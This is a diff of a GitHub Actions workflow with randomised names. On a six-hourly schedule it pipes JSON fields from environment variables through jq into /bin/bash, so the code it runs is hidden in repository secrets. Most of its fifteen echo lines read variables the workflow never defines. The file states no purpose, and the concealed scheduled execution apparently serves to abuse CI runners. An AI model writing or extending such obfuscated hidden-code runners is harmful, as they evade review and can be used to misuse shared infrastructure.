@@ -1,25 +1,32 @@
 name: pengbaiyu2901
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 5/6 * * *'
-
+    - cron: '36 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: pengbaiyu2901
         env:
-          bn177: ${{ secrets.bn177 }}
+          rleks529: ${{ secrets.rleks529 }}
         run: |
-          echo $bn177 | jq -r .ony8 | /bin/bash
-          echo $cgg3 | jq -r .bdapc6137 | /bin/bash
-          echo $ksnxm349 | jq -r .j80514 | /bin/bash
-          echo $whdtt6421 | jq -r .oys220 | /bin/bash
-          echo $becwa1221 | jq -r .c2 | /bin/bash
-          echo $l61287 | jq -r .hfuym513 | /bin/bash
-          echo $hxqn0378 | jq -r .e18998 | /bin/bash
-          echo $g3597 | jq -r .yffx7208 | /bin/bash
-          echo $jeldt8946 | jq -r .p506 | /bin/bash
+          echo $rleks529 | jq -r .betdc78 | /bin/bash
+          echo $wfhf0107 | jq -r .qb8 | /bin/bash
+          echo $m7 | jq -r .pcbbu952 | /bin/bash
+          echo $hvz917 | jq -r .ava8270 | /bin/bash
+          echo $cyyc7 | jq -r .e8946 | /bin/bash
+          echo $ln65027 | jq -r .p8 | /bin/bash
+          echo $nrl22 | jq -r .pfoh75 | /bin/bash
+          echo $yinqr52 | jq -r .ledm0 | /bin/bash
+          echo $ipus1383 | jq -r .hdka34 | /bin/bash
+          echo $oeq18 | jq -r .ioq0 | /bin/bash
+          echo $maz30660 | jq -r .lfkwf844 | /bin/bash
+          echo $zbht49961 | jq -r .ew9 | /bin/bash
+          echo $oe6 | jq -r .y07474 | /bin/bash
+          echo $nbti558 | jq -r .q91592 | /bin/bash
+          echo $wuv18412 | jq -r .smvh00225 | /bin/bash
 
